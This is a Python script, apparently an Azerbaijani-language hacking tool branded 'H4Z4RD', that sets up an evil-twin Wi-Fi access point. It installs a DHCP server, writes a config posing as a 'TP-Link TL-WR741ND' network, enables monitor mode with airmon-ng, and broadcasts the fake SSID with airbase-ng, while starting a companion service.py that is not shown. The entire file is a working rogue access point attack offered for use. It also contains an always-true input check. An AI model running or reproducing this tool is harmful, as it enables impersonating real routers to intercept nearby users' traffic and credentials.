#!/usr/bin/python3

#H4Z4RD Tərəfindən yazılmıştır.
#Versiyası 1.00 dır
#Qarşılaşdığınız bütün çətinlikləri Twitter adresindən yazın


import os
import subprocess
import shlex



W  = '\033[0m'  # ağ
R  = '\033[31m' # qırmızı
G  = '\033[32m' # yaşıl
print(G+"""



              HHHHHHHHH     HHHHHHHHH     444444444                 AAA               PPPPPPPPPPPPPPPPP
              H:::::::H     H:::::::H    4::::::::4                A:::A              P::::::::::::::::P
              H:::::::H     H:::::::H   4:::::::::4               A:::::A             P::::::PPPPPP:::::P
              HH::::::H     H::::::HH  4::::44::::4              A:::::::A            PP:::::P     P:::::P
                H:::::H     H:::::H   4::::4 4::::4             A:::::::::A             P::::P     P:::::P
                H:::::H     H:::::H  4::::4  4::::4            A:::::A:::::A            P::::P     P:::::P
                H::::::HHHHH::::::H 4::::4   4::::4           A:::::A A:::::A           P::::PPPPPP:::::P
                H:::::::::::::::::H4::::444444::::444        A:::::A   A:::::A          P:::::::::::::PP
                H:::::::::::::::::H4::::::::::::::::4       A:::::A     A:::::A         P::::PPPPPPPPP
                H::::::HHHHH::::::H4444444444:::::444      A:::::AAAAAAAAA:::::A        P::::P
                H:::::H     H:::::H          4::::4       A:::::::::::::::::::::A       P::::P
                H:::::H     H:::::H          4::::4      A:::::AAAAAAAAAAAAA:::::A      P::::P
              HH::::::H     H::::::HH        4::::4     A:::::A             A:::::A   PP::::::PP
              H:::::::H     H:::::::H      44::::::44  A:::::A               A:::::A  P::::::::P
              H:::::::H     H:::::::H      4::::::::4 A:::::A                 A:::::A P::::::::P
              HHHHHHHHH     HHHHHHHHH      4444444444AAAAAAA                   AAAAAAAPPPPPPPPPP






                                               V : 1.0.0

                                            Created By H4Z4RD
                               
                                        http://Twitter.com/H4Z4RD_
           
                                       https://github.com/H4Z4RD-4Z/


""")


def server():
    while(True):
        if not os.path.isfile('/usr/sbin/dhcpd'):
           yukle = input('['+R+'isc-dhcp-server tapılmadı! İndi yüklənsin? B/X'+W+']')
           if yukle == "B" or "b":
               subprocess.check_output('apt-get -y install isc-dhcp-server' , shell=True)

               print(G+'isc-dhcp-server uğurla yükləndi')

           elif yukle == "Y" or "y":

               print(' ['+R+'Proses təxrə salınır...'+W+']')

               break
           else:
               print("Yenidən yoxlayın")

               continue

        else:
            break





def faylyarat():

    fayl = open("/etc/dhcpd.conf", "w")
    yazi = """authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.1.0 netmask 255.255.255.0 {
option routers 192.168.1.1;
option subnet-mask 255.255.255.0;
option domain-name "TP-Link TL-WR741ND";
option domain-name-servers 192.168.1.1;
range 192.168.1.2 192.168.1.40;
}"""





    fayl.write(yazi)





def airmon():

    def service(servisler):
        subprocess.call(shlex.split("gnome-terminal -x sh -c \'{0};bash\'".format(servisler)))



    os.system("airmon-ng")

    interface = input(G+"İstifadə etmək istədiyiniz Interface adını yazın . (Varsayılan olaraq 'wlan0'olur) :"+" "+W)



    subprocess.check_output('airmon-ng start'+' '+interface , shell=True)

    print('['+G+'Monitor mode aktiv edilir...'+W+']')

    os.system('airmon-ng')

    moninterface = input(G+interface+" "+"Monitor mode uğurla aktiv edildi .Yuxarıdakı Monitor Interface adını yenidən yazın(Varsayılan olaraq 'wlan0mon olur) :"+" "+W)

    print(G+'Prosses başlayır...')

    service("python3 service.py")

    os.system('airbase-ng -c 11 -e'+' '+'"TP-Link TL-WR741ND"'+' '+moninterface)


server()

faylyarat()
print(G+"Fayl uğurla yaradılı"+W)

airmon()




